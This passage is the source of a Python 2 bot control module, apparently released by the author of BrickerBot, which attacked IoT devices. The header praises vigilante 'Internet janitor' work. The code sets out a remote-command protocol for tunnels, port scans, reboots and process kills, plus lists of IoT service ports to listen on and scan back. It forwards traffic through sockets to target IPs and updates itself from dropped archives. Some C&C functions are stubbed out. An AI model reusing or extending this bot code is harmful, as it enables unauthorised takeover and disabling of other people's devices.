# cleaning up the IoT mess back in 2016-2018, and many of the payloads are 
# still relevant in 2020.
# 
# I do recommend that you check a few of my postings if you intend to read the
# code. In particular Part 9 of my writeup will give you insights on design and
# workflows. DeepPaste is temperamental (offline half the time) but you can 
# hopefully still obtain my 2018 posting here:
#
# http://depastedihrn3jtw.onion.pet/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Clearnet)
# http://depastedihrn3jtw.onion/show.php?md5=bfe590279a2a77e0a3438b596653ab85 (Tor)
#
# I also wrote some additional comments on this code release here:
#
# http://depastedihrn3jtw.onion.pet/show.php?md5=c5726e7e2272bfc12642e57112b21256 (Clearnet)
# http://depastedihrn3jtw.onion/show.php?md5=c5726e7e2272bfc12642e57112b21256 (Tor)
#
# Keep in mind that this was simply designed as a first-responder type sensor  
# and for more ambitious large-scale cleanups I recommend taking a multi-layered 
# approach. It is a good idea to have fallback systems in place to double-
# check the work of your frontline systems and verify that there are no longer  
# operational devices on the IP:ports that were supposedly cleaned up (and if 
# necessary engage in additional corrective measures/debugging). Otherwise you
# will lose sight of the effectiveness of your payloads.
#
# This system has been referred to as 'BrickerBot' (trademark owned by Radware
# Ltd) which in practice was a multi-layered architecture with different 
# subsystems performing different tasks such as hash cracking. I had separate 
# subsystems in place for dealing with SSH and SSL workloads (not included here).
# 
# Good luck to future Internet janitors.
# 
# 'There is no limit to the good you can do if you don't care who gets the 
#  credit. '                                         -General George Marshall
#  
##############################################################################
#
# Raw protocol command reference (remote control)
# Must go first: SQ:<id>
# RQ:<refid>:<timestamp>:<wildcard> (request update since including timestamp, pattern match)
# TN:<refid>:<time in minutes>:<listenip>:<listenport>:<targetip> (tunnel, time 0 leaves permanent)
# SN:<refid>:<sentinel status 0 or 1> (defaults to 0)
# sTN:<refid><show TN 0 or 1> (defaults to 0)
# sSO:<refid><show SO 0 or 1> (defaults to 0)
# sSR:<refid><show SR 0 or 1> (defaults to 1)
# sSD:<refid><show SD 0 or 1> (defaults to 1)
# sBR:<refid><show BR 0 or 1> (defaults to 1)
# sBL:<refid><show BL 0 or 1> (defaults to 0 - 'light mode' BR)
# sWP:<refid><show WP 0 or 1> (defaults to 1)
# eSC:<refid><exec SC 0 or 1> (defaults to 1)
# eBR:<refid><exec BR 0 or 1> (defaults to 1)
# eWP:<refid><exec WP 0 or 1> (defaults to 1)
# eHP:<refid><exec HP 0 or 1> (defaults to 1)
# eRW:<refid><exec RW 0 or 1> (defaults to 1)  - should default to 0 eventually though (return web scan)
# aLP:<refid>:<port> (dynamically add sentinel listen port)
# rLP:<refid>:<port> (dynamically close sentinel listen port)
# aSC:<refid>:<port> (dynamically add sentinel scan port)
# rSC:<refid>:<port> (dynamically close sentinel scan port)
# aWP:<refid>:<port> (dynamically add sentinel web port - sends GET / HTTP/1.1 on connect)
# rWP:<refid>:<port> (dynamically close sentinel web port)
# SCN:<refid>:<ip or range> (launch basic scan on ip - range must be /24 for now, e.g. 1.2.3.4-5)
# SCP:<refid>:<port or range>:<ip or range> (launch scan on ip:port - range must be /24 as above)
# RST:<refid> (request process killall - may be good for low RAM situations)
# RBT:<refid> (request system reboot)
#


import socket, sys, select, time, re, binascii, subprocess, os, random, struct, signal
from itertools import izip, cycle

# simple versioning - basically how many revisions of the codebase since build number 1
# most recent build 7/31 2020
controlbuild = 373
myip = ""

CONTROLlistenports = [ 80, 82 ]
CONTROLlistensockbuf = []
CONTROLlistenhttpbuf = []
CONTROLlistenhttpstat = {}
CONTROLlistenwebreq = {}
CONTROLlistenstarttime = {}
CONTROLlistenwebstate = {}
CONTROLlistenreplybuf = {}
CONTROLlistenreplyhandle = {}
CONTROLlistentimemax = 15
CONTROLlistentimewebreqmax = 100

controlfilename = "payloadsrv"
controlmagic = 'RF1980'
controlwww = '/tmp/system/www/'
controllocalwww = '/tmp/system/localwww/'
controlsecretsize = 317
controlseq = 0
controlsecretcache = '/tmp/system/tmp/urandom'
controlsecretkey = ''
controllocaltokencache = '/tmp/system/tmp/localtoken'
controllocaltokenkey = ''
controlconfigfilename = '/tmp/system/control.cfg'
controllaunchtime = time.time()

# config file stuff, defaults for sentinel
CONTROLsentinelenable = False
# ports to listen on for incoming connections - this makes sense to change
# frequently in order to prevent adversaries from fingerprinting the 
# sensors with SYN packets
#CONTROLsentinellistenports = [ 23, 2222, 2323, 7547, 5555, 23231, 6789, 37777, 19058, 23123, 5358, 8023, 8022, 1433, 3306, 445, 110, 21, 81, 83, 84, 88, 8080, 8081, 8082, 4719, 9797, 9999, 8181, 1900, 49152, 9000, 1099, 8000, 3000, 8090, 8880, 10000, 9527, 37215, 52869, 9001, 10023, 60001 ]
CONTROLsentinellistenports = [ 23, 2323, 5358, 8080, 37215, 60001 ]
# default scan-back ports
CONTROLsentinelscanports = [ 22, 23, 26, 80, 81, 82, 83, 84, 8000, 2222, 2323, 8080, 8081, 8082, 23231, 23123, 6789, 7547, 5555, 19058, 8023, 8022, 5358, 5000, 5001, 8888, 9000, 4719, 88, 9999, 12323, 8181, 60023, 1080, 3000, 3749, 8001, 8060, 8090, 8880, 10000, 9527, 37215, 52869, 9001, 10023, 2601 ]
CONTROLsentinelscanwebports = [ 80, 81, 82, 83, 84, 5555, 8080, 8081, 8082, 7547, 9000, 10000, 37215, 52869, 60001, 4567 ]
CONTROLsentinelshowTN = False
CONTROLsentinelshowSO = False
CONTROLsentinelshowSR = False
CONTROLsentinelshowSD = True
CONTROLsentinelshowBR = True
CONTROLsentinelshowBL = True
CONTROLsentinelshowWP = True
CONTROLsentinelexecBR = True
CONTROLsentinelexecSC = True
CONTROLsentinelexecWP = True
CONTROLsentinelexecRW = True
CONTROLsentinelexecHP = False
CONTROLsentinelexecPM = False

tokenhashcache = {}

# using sockets for tunneling since iptables is not supported on all ubnt
tunnelbindbuf = []
tunnelreference = {}
tunnelincomingbuf = []
tunnelforwardbuf = []
tunnelincomingsocket = {}
tunnelincomingtask = {}
tunnelincomingsocketforward = {}
tunnelforwardstat = {}
tunnelforwardsocket = {}
tunnelforwardtask = {}
tunnelforwardsocketincoming = {}

lastsystemram = 0

publicmessage = ''


def recv_timeout( readsock, timeout = 2 ):
	readsock.setblocking(0)
	total_data = []
	data = ''
	begin = time.time()
	total_size = 0
	while True:
		if time.time() - begin > timeout:
			break
		try:
			data = readsock.recv(512)
			if data:
				total_data.append(data)
				total_size += len(data)
				if total_size > 150:
					return '' . join(total_data)
				begin = time.time()
			else:
				time.sleep(0.01)
		except:
			pass
	return '' . join(total_data)

def log_session( textstr ):
	try:
		f = open( "/tmp/system/session.txt", "a" )
		f.write( "%d %s\n" % ( time.time(), textstr ) )
		f.close()
	except:
		pass
	try:
		print "%s" % ( textstr )
	except:
		pass

def CONTROLloadconfig( filename ):
	global CONTROLsentinelenable
	global CONTROLsentinelshowTN
	global CONTROLsentinelshowSO
	global CONTROLsentinelshowSR
	global CONTROLsentinelshowSD
	global CONTROLsentinelshowBR
	global CONTROLsentinelshowBL
	global CONTROLsentinelshowWP
	global CONTROLsentinelexecSC
	global CONTROLsentinelexecBR
	global CONTROLsentinelexecWP
	global CONTROLsentinelexecRW
	global CONTROLsentinelexecHP
	global CONTROLsentinelexecPM
	global CONTROLsentinellistenports
	global CONTROLsentinelscanports
	global CONTROLsentinelscanwebports

	# touch the config in case it doesn't exist..
	try:
		open( filename, 'a' ).close()
	except:
		pass
	try:
		f = open( filename, 'r' )
		config = f.read().split('\n')
		for line in config:
			matches = re.search( 'SNT: (\d+)', line )
			if matches:
				CONTROLsentinelenable = bool(int(matches.group(1)))
			matches = re.search( 'sTN: (\d+)', line )
			if matches:
				CONTROLsentinelshowTN = bool(int(matches.group(1)))
			matches = re.search( 'sSO: (\d+)', line )
			if matches:
				CONTROLsentinelshowSO = bool(int(matches.group(1)))
			matches = re.search( 'sSR: (\d+)', line )
			if matches:
				CONTROLsentinelshowSR = bool(int(matches.group(1)))
			matches = re.search( 'sSD: (\d+)', line )
			if matches:
				CONTROLsentinelshowSD = bool(int(matches.group(1)))
			matches = re.search( 'sBR: (\d+)', line )
			if matches:
				CONTROLsentinelshowBR = bool(int(matches.group(1)))
			matches = re.search( 'sBL: (\d+)', line )
			if matches:
				CONTROLsentinelshowBL = bool(int(matches.group(1)))
			matches = re.search( 'sWP: (\d+)', line )
			if matches:
				CONTROLsentinelshowWP = bool(int(matches.group(1)))
			matches = re.search( 'eSC: (\d+)', line )
			if matches:
				CONTROLsentinelexecSC = bool(int(matches.group(1)))
			matches = re.search( 'eBR: (\d+)', line )
			if matches:
				CONTROLsentinelexecBR = bool(int(matches.group(1)))
			matches = re.search( 'eWP: (\d+)', line )
			if matches:
				CONTROLsentinelexecWP = bool(int(matches.group(1)))
			matches = re.search( 'eRW: (\d+)', line )
			if matches:
				CONTROLsentinelexecRW = bool(int(matches.group(1)))
			matches = re.search( 'eHP: (\d+)', line )
			if matches:
				CONTROLsentinelexecHP = bool(int(matches.group(1)))
			matches = re.search( 'ePM: (\d+)', line )
			if matches:
				CONTROLsentinelexecPM = bool(int(matches.group(1)))
			if 'aLP: ' in line[:7]:
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				CONTROLsentinellistenports = importarray
			if 'aSC: ' in line[:7]:
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				CONTROLsentinelscanports = importarray
			if 'aWP: ' in line[:7]:
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				CONTROLsentinelscanwebports = importarray
		f.close()
	except:
		log_session( 'ERR: Could not read config.' )

def saveconfig( filename ):
	global CONTROLsentinelenable
	global CONTROLsentinelshowTN
	global CONTROLsentinelshowSO
	global CONTROLsentinelshowSR
	global CONTROLsentinelshowSD
	global CONTROLsentinelshowBR
	global CONTROLsentinelshowBL
	global CONTROLsentinelshowWP
	global CONTROLsentinelexecSC
	global CONTROLsentinelexecBR
	global CONTROLsentinelexecWP
	global CONTROLsentinelexecRW
	global CONTROLsentinelexecHP
	global CONTROLsentinelexecPM
	global CONTROLsentinellistenports
	global CONTROLsentinelscanports
	global CONTROLsentinelscanwebports
	try:
		f = open( filename, 'w' )
		f.write( 'SNT: %i\n' % ( CONTROLsentinelenable ) )
		f.write( 'sTN: %i\n' % ( CONTROLsentinelshowTN ) )
		f.write( 'sSO: %i\n' % ( CONTROLsentinelshowSO ) )
		f.write( 'sSR: %i\n' % ( CONTROLsentinelshowSR ) )
		f.write( 'sSD: %i\n' % ( CONTROLsentinelshowSD ) )
		f.write( 'sBR: %i\n' % ( CONTROLsentinelshowBR ) )
		f.write( 'sBL: %i\n' % ( CONTROLsentinelshowBL ) )
		f.write( 'sWP: %i\n' % ( CONTROLsentinelshowWP ) )
		f.write( 'eSC: %i\n' % ( CONTROLsentinelexecSC ) )
		f.write( 'eBR: %i\n' % ( CONTROLsentinelexecBR ) )
		f.write( 'eWP: %i\n' % ( CONTROLsentinelexecWP ) )
		f.write( 'eRW: %i\n' % ( CONTROLsentinelexecRW ) )
		f.write( 'eHP: %i\n' % ( CONTROLsentinelexecHP ) )
		f.write( 'ePM: %i\n' % ( CONTROLsentinelexecPM ) )
		f.write( 'aLP: %r\n' % ( CONTROLsentinellistenports ) )
		f.write( 'aSC: %r\n' % ( CONTROLsentinelscanports ) )
		f.write( 'aWP: %r\n' % ( CONTROLsentinelscanwebports ) )
		f.close()
	except:
		log_session( 'ERR: Could not write config.' )


def is_private_ip( ip ):
	if ip[:3] == '10.':
		return 1
	if ip[:8] == '192.168.':
		return 1
	if ip[:4] == '127.':
		return 1
	if ip[:4] == '172.':
		octet = re.search( '^172\.(\d+)\.', ip )
		if octet and int(octet.group(1)) >= 16 and int(octet.group(1)) <= 31:
			return 1
	if ip[:4] == '100.':
		octet = re.search( '^100\.(\d+)\.', ip )
		if octet and int(octet.group(1)) >= 64 and int(octet.group(1)) <= 127:
			return 1
	return 0

def controlgeneratefilepayload( filename, sharedkey ):
  # removed C&C related stuff here
	return ""
	
def controlsavefilepayload( payload, filename, sharedkey ):
  # removed C&C related stuff here
	return 0
		
# these are for shorter comms so the xor overhead is scaled back
def controlcreaterequest( req, sharedkey ):
  # removed C&C related stuff here
	return ""
	
def controlparserequest( payload, sharedkey ):
  # removed C&C related stuff here
	return ""
			
def generatewwwtoken( fromip, toip, secret ):
  # removed C&C related stuff here
	return ""

def checkwwwtoken( payload, fromip, toip, secret ):
	return 1

def create_tunnel_bind( listenip, listenport, toip, toport, timeval ):
	# TODO : need try here
	tunneltask = ( listenip, int(listenport), toip, int(toport), time.time() + timeval * 60 )
	lnewsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	lnewsock = lnewsock
	lnewsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	try:
		lnewsock.bind((tunneltask[0], tunneltask[1]))
	except:
		log_session( "ERR: Could not bind tunnel listener %s:%d" % ( tunneltask[0], tunneltask[1] ) )
		return 0
	lnewsock.listen(5)
	tunnelbindbuf.append(lnewsock)
	lsockhash = hash(lnewsock)
	tunnelreference[lsockhash] = tunneltask
	log_session( "NOTC: Created tunnel listener %s:%d>%s:%d (%d minutes)" % ( tunneltask[0], tunneltask[1], tunneltask[2], tunneltask[3], timeval ) )
	return 1

def create_tunnel_connection( inewsock, fromip, fromport, listentask ):
#	try:
	if True:
		tunneltask = ( fromip, int(fromport), listentask[0], listentask[1], listentask[2], listentask[3], listentask[4] )
		# create forwarder		
		fnewsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		fnewsock = fnewsock
		fnewsock.setblocking(0)
		try:
			fnewsock.connect((tunneltask[4], tunneltask[5]))
		except:
			pass
		# pair them up
		isockhash = hash(inewsock)
		fsockhash = hash(fnewsock)
		tunnelincomingbuf.append(inewsock)
		tunnelincomingtask[isockhash] = tunneltask
		tunnelincomingsocket[isockhash] = inewsock
		tunnelincomingsocketforward[isockhash] = fnewsock
		tunnelforwardbuf.append(fnewsock)
		tunnelforwardtask[fsockhash] = tunneltask
		tunnelforwardsocketincoming[fsockhash] = inewsock
		log_session( "NOTC: Created tunnel connection %s:%d>%s:%d>%s:%d" % ( tunneltask[0], tunneltask[1], tunneltask[2], tunneltask[3], tunneltask[4], tunneltask[5] ) )
		return 1
#	except:
#		log_session("ERR: Tunnel creation failed",tunneltask)
	return 0

def close_tunnel_incoming( lsock ):
	lsockhash = hash(lsock)
	log_session("NOTC: Terminating tunnel %s:%d>%s:%d>%s:%d" % ( tunnelincomingtask[lsockhash][0], tunnelincomingtask[lsockhash][1], tunnelincomingtask[lsockhash][2], tunnelincomingtask[lsockhash][3], tunnelincomingtask[lsockhash][4], tunnelincomingtask[lsockhash][5] ) )
	try:
		lsock.close()
	except:
		pass
	fsock = tunnelincomingsocketforward[lsockhash]
	tunnelincomingsocket[lsockhash] = None
	tunnelincomingtask[lsockhash] = None
	tunnelincomingsocketforward[lsockhash] = None
	tunnelincomingbuf.remove(lsock)
	# close counterpart
	try:
		fsock.close()
	except:
		pass
	fsockhash = hash(fsock)
	tunnelforwardsocket[fsockhash] = None
	tunnelforwardtask[fsockhash] = None
	tunnelforwardsocketincoming[fsockhash] = None
	tunnelforwardbuf.remove(fsock)
	
def close_tunnel_forward( fsock ):
	fsockhash = hash(fsock)
	log_session("NOTC: Terminating tunnel %s:%d>%s:%d>%s:%d" % ( tunnelforwardtask[fsockhash][0], tunnelforwardtask[fsockhash][1], tunnelforwardtask[fsockhash][2], tunnelforwardtask[fsockhash][3], tunnelforwardtask[fsockhash][4], tunnelforwardtask[fsockhash][5] ) )
	try:
		fsock.close()
	except:
		pass
	lsock = tunnelforwardsocketincoming[fsockhash]
	tunnelforwardsocket[fsockhash] = None
	tunnelforwardtask[fsockhash] = None
	tunnelforwardsocketincoming[fsockhash] = None
	tunnelforwardbuf.remove(fsock)
	# close counterpart
	try:
		lsock.close()
	except:
		pass
	lsockhash = hash(lsock)
	tunnelincomingsocket[lsockhash] = None
	tunnelincomingtask[lsockhash] = None
	tunnelincomingsocketforward[lsockhash] = None
	tunnelincomingbuf.remove(lsock)
	
def close_tunnel_bind( bindsock, bindhash ):
	try:
		bindsock.close()
	except:
		pass
	tunnelreference[bindhash] = None
	tunnelbindbuf.remove(bindsock)
	curtime = time.time()
	# now look for any lingering open connections to also clean up..
	for sock in tunnelincomingbuf:
		sockhash = hash(sock)
		if curtime > tunnelincomingtask[sockhash][6]:
			close_tunnel_incoming( sock ) 	
	

# skip unit tests with cleaned functions
#
#testpayload = controlcreaterequest( "hello there", "T3StK3ySiKure" );
#if controlparserequest( testpayload, "T3StK3ySiKure" ) != "hello there":
#	print "Failed controlcreate/parsereq sanity check, aborting!"
#	exit()
#if controlparserequest( testpayload, "T3StK3ySiKur2" ) == "hello there":
#	print "Failed controlcreate/parsereq sanity check, aborting!"
#	exit()
#	
#token = generatewwwtoken( "127.0.0.1", "100.110.120.130", "sup3rsukr3tx0rpw" )
#if not checkwwwtoken( token, "127.0.0.1", "100.110.120.130", "sup3rsukr3tx0rpw" ):
#	print "Failed token sanity check, aborting!"
#	exit()
#if checkwwwtoken( token, "127.0.0.1", "100.110.120.131", "sup3rsukr3tx0rpw" ):
#	print "Failed token sanity check, aborting!"
#	exit()
	
privateiptest = [ '10.0.0.1', '192.168.1.1', '172.16.0.1', '127.0.1.2' ]
publiciptest = [ '1.2.3.4', '223.1.2.3', '128.0.0.1', '192.169.1.1', '172.32.1.2' ]
for testip in privateiptest:
	if not is_private_ip( testip ):
		print "Failed private IP check for %s, aborting!" % ( testip )
		exit()
for testip in publiciptest:
	if is_private_ip( testip ):
		print "Failed private IP check for %s, aborting!" % ( testip )
		exit()
		
def reverse_readline(filename, cutoffts, wildcard, buf_size=8192):
	fh = open(filename, "r")
	try:
		segment = None
		offset = 0
		fh.seek(0, os.SEEK_END)
		file_size = remaining_size = fh.tell()
		while remaining_size > 0:
			offset = min(file_size, offset + buf_size)
			fh.seek(file_size - offset)
			buffer = fh.read(min(remaining_size, buf_size))
			remaining_size -= buf_size
			lines = buffer.split('\n')
			if segment is not None:
				if buffer[-1] is not '\n':
					lines[-1] += segment
				else:
					matches = re.search('^(\d+)\s', segment)
					if matches:
						if int(matches.group(1)) < cutoffts:
							raise StopIteration
						if wildcard != '':
							if re.search(wildcard,segment):
								yield segment
						else:
							yield segment
			segment = lines[0]
			for index in range(len(lines) - 1, 0, -1):
				if len(lines[index]):
					matches = re.search('^(\d+)\s', lines[index])
					if matches:
						if int(matches.group(1)) < cutoffts:
							raise StopIteration
						if wildcard != '':
							if re.search(wildcard,lines[index]):
								yield lines[index]
						else:
							yield lines[index]
		if segment is not None:
			matches = re.search('^(\d+)\s', segment)
			if matches:
				if int(matches.group(1)) < cutoffts:
					raise StopIteration
				if wildcard != '':
					if re.search(wildcard,segment):
						yield segment
				else:
					yield segment
	finally:
		fh.close()
	
def close_webtask( websock ):
	try:
		websock.close()
	except:
		pass
	CONTROLlistenhttpbuf.remove(websock)
	connhash = hash(websock)
	CONTROLlistenhttpstat[connhash] = None
	CONTROLlistenwebreq[connhash] = None
	CONTROLlistenstarttime[connhash] = None
	CONTROLlistenwebstate[connhash] = None
	CONTROLlistenreplybuf[connhash] = None
	if connhash in CONTROLlistenreplyhandle and CONTROLlistenreplyhandle[connhash] != None:
		try:
			CONTROLlistenreplyhandle[connhash].close()
		except:
			pass
	CONTROLlistenreplyhandle[connhash] = None

def create_file_payload( websock, connhash, filename ):
	try:
		fhandle = open( filename, 'rb' )
		fhandle.seek(0, os.SEEK_END)
		fsize = fhandle.tell()
		fhandle.seek(0, os.SEEK_SET)
		CONTROLlistenwebstate[connhash] = 2
		CONTROLlistenreplyhandle[connhash] = fhandle
		# just in case
		websock.setblocking(0)
		CONTROLlistenreplybuf[connhash] = 'HTTP/1.1 200 OK\r\nDate: %s\r\nServer: lighttpd/1.4.44\r\nContent-Length: %d\r\n\r\n' % ( time.strftime('%a, %d %b %Y %T GMT',time.gmtime() ), fsize )
		# TODO: preseed replybuf with some file contents..?
	except:
		log_session( "ERR: File payload creation failed" )

def create_data_payload( websock, connhash, data ):
	CONTROLlistenwebstate[connhash] = 2
	# just in case
	websock.setblocking(0)
	CONTROLlistenreplybuf[connhash] = 'HTTP/1.1 200 OK\r\nDate: %s\r\nServer: lighttpd/1.4.44\r\nContent-Length: %d\r\n\r\n' % ( time.strftime('%a, %d %b %Y %T GMT',time.gmtime() ), len(data) )
	CONTROLlistenreplybuf[connhash] += data;

def handle_file_request( websock, connhash, token ):
  # took out some private stuff here
	return 0

def handle_cmd_request( websock, connhash, token ):
  # took out some private stuff here
	return 0

def handle_new_web_request( websock, connhash, request ):
  # took out some private stuff here
	return 0		

def logsystemhealth():
	global CONTROLsentinelenable
	global lastsystemram
	stats_memtotal = 0
	stats_memfree = 0
	stats_loadavg = "N/A"
	stats_uptime = 0
	stats_sockets = 0
	procmemfd = open("/proc/meminfo","r")
	procmem = procmemfd.readlines()
	procmemfd.close()
	for line in procmem:
		matches = re.search( 'MemTotal:\s+(\d+)\skB', line )
		if matches:
			stats_memtotal = int( matches.group(1) )
		matches = re.search( 'MemFree:\s+(\d+)\skB', line )
		if matches:
			stats_memfree = int( matches.group(1) )
	loadavgfd = open("/proc/loadavg","r")
	loadavg = loadavgfd.readlines()
	loadavgfd.close()
	for line in loadavg:
		matches = re.search( '^([\d\.]+\s[\d\.]+\s[\d\.]+\s\S+\s\d+)', line )
		if matches:
			stats_loadavg = matches.group(1)
	uptimefd = open("/proc/uptime","r")
	uptime = uptimefd.readlines()
	uptimefd.close()
	for line in uptime:
		matches = re.search( '^(\d+)', line )
		if matches:
			stats_uptime = int( matches.group(1) )
	sockstatfd = open("/proc/net/sockstat","r")
	sockstat = sockstatfd.readlines()
	sockstatfd.close()
	for line in sockstat:
		matches = re.search( 'sockets:.*used\s(\d+)', line )
		if matches:
			stats_sockets = int( matches.group(1) )
	diskfree = "NA"
	disktotal = "NA"
	diskperc = "-%"
	#expecting something along these lines.. # df -h
	#Filesystem                Size      Used Available Use% Mounted on
	#rootfs                    5.3M      5.3M         0 100% /
	#/dev/root                 5.3M      5.3M         0 100% /
	#tmpfs                     9.0M      7.5M      1.5M  83% /var
	#dev                      30.3M         0     30.3M   0% /dev
	try:
		pipe = subprocess.Popen('df -h', shell=True, stdout=subprocess.PIPE)
		data = pipe.communicate()[0].split('\n')
		for line in data:
			matches = re.search( 'tmpfs\s+(\S+)\s+\S+\s+(\S+)\s+(\S+)\s+/var', line )
			if matches:
				disktotal = matches.group(1)
				diskfree = matches.group(2)
				diskperc = matches.group(3)
	except:
		pass
	proccount_other = 0
	proccount_sentinel = 0
	proccount_control = 0
	proccount_python = 0
	proccount_nmap = 0
	proccount_tcpdump = 0
	proccount_dropbear = 0
	proccount_watchdog = 0
	try:
		pipe = subprocess.Popen('ps w', shell=True, stdout=subprocess.PIPE)
		data = pipe.communicate()[0].split('\n')
		for line in data:
			if re.search( 'python.*sentinel\.py', line ):
				proccount_sentinel += 1
			elif re.search( 'python.*control\.py', line ):
				proccount_control += 1
			elif re.search( 'python', line ):
				proccount_python += 1
			elif re.search( 'nmap', line ):
				proccount_nmap += 1
			elif re.search( 'tcpdump', line ):
				proccount_tcpdump += 1
			elif re.search( 'dropbear', line ):
				proccount_dropbear += 1
			elif re.search( 'bin\/sh.*cswatchdog\.sh', line ):
				if proccount_watchdog == 1:
					# hmm - already one watchdog - find out the PID of the next one
					matches = re.search( '^\s*(\d+)\s.*bin\/sh.*cswatchdog\.sh', line )
					if matches:
						extrapid = int(matches.group(1))
						if extrapid > 0:
							log_session( 'NOTC: Trying to kill redundant proc %s' % (line.strip()) )
							try:
								os.kill( extrapid, signal.SIGKILL )
							except:
								pass
				proccount_watchdog += 1
			elif re.search( '^\s*\d+\s\S', line ):
				proccount_other += 1
	except:
		pass	
	if proccount_tcpdump >= 3:
		log_session( 'NOTC: Detected %d tcpdumps, killing all' % (proccount_tcpdump) )
		try:
			pipe = subprocess.Popen('killall -9 tcpdump', shell=True, stdout=subprocess.PIPE)
			pipe.communicate()
		except:
			pass
	lastsystemram = int(stats_memfree)
	CONTROLsentinelflag = 0
	if CONTROLsentinelenable:
		CONTROLsentinelflag = 1			
	log_session( "SH V: %d RAM: %d/%d kB (%.2f%%) DRV: %s/%s (%s) LD: %s UT: %d SCK: %d PS: %d/%d/%d/%d/%d/%d/%d SNT: %d WQ: %d" % ( controlbuild, ( stats_memfree ), stats_memtotal, 100.0 - 100.0 * float( stats_memfree ) / float( max( stats_memtotal, 1 ) ), diskfree, disktotal, diskperc, stats_loadavg, stats_uptime, stats_sockets, proccount_other, proccount_sentinel, proccount_control, proccount_python, proccount_nmap, proccount_tcpdump, proccount_dropbear, CONTROLsentinelflag, len( CONTROLlistenhttpbuf ) ) )



def poll_www_folders():
	# check for changes
	listdir( controlwww )
	listdir( controllocalwww )

def check_minute_tasks():
	global CONTROLsentinelenable
	global controllaunchtime

	# TODO - poll_www_folders()
	# TODO: a /tmp/system/www/ handler - cache files every N minutes in RAM and serve hits	
	should_shutdown = False

	# check if we need to fire up missing processes, apply a cooldown 
#	if CONTROLsentinelenable:
	if False:
		proccount_CONTROLsentinel = 0
		try:
			pipe = subprocess.Popen('ps w', shell=True, stdout=subprocess.PIPE)
			data = pipe.communicate()[0].split('\n')
			for line in data:
				if re.search( 'python.*sentinel\.py', line ):
					proccount_CONTROLsentinel += 1
			if proccount_CONTROLsentinel == 0:
				log_session( "NOTC: Task sentinel.py missing - trying to launch" )
				# TODO: suspected crash issue with running too many procs at once
				subprocess.Popen('/tmp/system/bin/python /tmp/system/sentinel.py', shell=True)
		except:
			pass
	
	# check on bg task pipes
	#TODO	

	# finally, check if there are updates available
	# TODO: maybe dont do this if there are bg task pipes active? we'll lose the output otherwise
	try: 
		if os.path.isfile('/tmp/system/update/update.tgz'):
			log_session('NOTC: Update found, trying to unpack')
			pipe = subprocess.Popen('gzip -d update.tgz;tar -xf update.tar;rm -f update.tar;rm -f cswatchdog.sh', shell=True, stdout=subprocess.PIPE, cwd='/tmp/system/update/')
			data = pipe.communicate()[0].split('\n')
	except:
		pass
#	if not CONTROLsentinelenable:
	if True:
		# if sentinel isn't running we do the update on its behalf
		try:
			if os.path.isfile('/tmp/system/update/sentinel.py'):
				pipe = subprocess.Popen('mv -f /tmp/system/update/sentinel.py /tmp/system/', shell=True, stdout=subprocess.PIPE)
				pipe.communicate()
				log_session('NOTC: Updated sentinel.py')
		except:
			pass	
	try: 
		if os.path.isfile('/tmp/system/update/control.py'):
			pipe = subprocess.Popen('mv -f /tmp/system/update/control.py /tmp/system/;mv -f /tmp/system/update/*.txt /tmp/system/;mv -f /tmp/system/update/*.cfg /tmp/system/', shell=True, stdout=subprocess.PIPE)
			pipe.communicate()
			log_session('NOTC: Quitting to update control.py')
			should_shutdown = True
	except:
		pass
		
	# any fan mail?
  # fwiw i never got any :(((
	try:
		if os.path.isfile('/tmp/message.txt'):
			f = open( '/tmp/message.txt', "r" );
			fanmail = f.read()
			f.close()
			fanmail = re.sub( '\r?\n', ';', fanmail )
			log_session( "MSG: " + fanmail )
			os.remove('/tmp/message.txt')
	except:
		pass
		
	if should_shutdown:
		# try to close listeners cleanly just in case to prevent hung sockets
		for CONTROLlistensock in CONTROLlistensockbuf:
			try:
				CONTROLlistensock.close()
			except:
				pass
		for CONTROLlistensock in CONTROLlistenhttpbuf:
			try:
				CONTROLlistensock.close()
			except:
				pass
		exit()

def check_4h_jobs():
	# rewrite session file.. lazy :) 
	try:
#		pipe = subprocess.Popen('tail -n 3000 /tmp/system/session.txt >/tmp/system/session.tmp;mv -f /tmp/system/session.tmp /tmp/system/session.txt', shell=True, stdout=subprocess.PIPE)
		# probably will lose some data here sometimes but such is life.. drive getting full sucks too
		pipe = subprocess.Popen('tail -n 1000 /tmp/system/session.txt >/tmp/system/session.tmp;mv -f /tmp/system/session.tmp /tmp/system/session.txt', shell=True, stdout=subprocess.PIPE)
		pipe.communicate()
	except:
		pass	
	


# initialisation stuff

debugmode = False
testmode = False
if len(sys.argv) >= 2:
	for argv in sys.argv:
		if argv == '--debug':
			debugmode = True
		if argv == '--test':
			testmode = True

if debugmode:
	create_tunnel_bind( '0.0.0.0', 9955, '127.0.0.1', 22, 1 )
	


# create www/localwww/tmp folders if needed
try:
	os.mkdir('/tmp/system')
except:
	pass	
try:
	os.mkdir('/tmp/system/tmp')
except:
	pass	
try:
	os.mkdir('/tmp/system/update')
except:
	pass	
try:
	os.mkdir('/tmp/system/www')
except:
	pass	
try:
	os.mkdir('/tmp/system/localwww')
except:
	pass	


# check if there has been a crash log to report, then redirect stderr
if not debugmode:
	crashdump = ''
	try:
		f = open( '/tmp/system/tmp/control.err', "r" );
		crashdump = f.read()
		f.close()
	except:
		pass
	if crashdump:
		crashdump = re.sub( '\r?\n', ';', crashdump )
		log_session( "CDUMP: " + crashdump )
	sys.stderr = open('/tmp/system/tmp/control.err', 'w')


# hack to get around a potentially lost update before we exec
if True:
	# if sentinel isn't running we do the update on its behalf
	try:
		if os.path.isfile('/tmp/system/update/sentinel.py'):
			pipe = subprocess.Popen('mv -f /tmp/system/update/sentinel.py /tmp/system/', shell=True, stdout=subprocess.PIPE)
			pipe.communicate()
	except:
		pass	


# Mothballing - clear old jobreqs on bootup
if True:
	try:
		pipe = subprocess.Popen('rm -f /tmp/system/update/sentinel.jobreq*', shell=True, stdout=subprocess.PIPE);
		pipe.communicate();
	except:
		pass



# pacing to keep some devices from rebooting on startup
time.sleep(5)

# check if our local secret exists, and if needed create it
need_new_secret = False
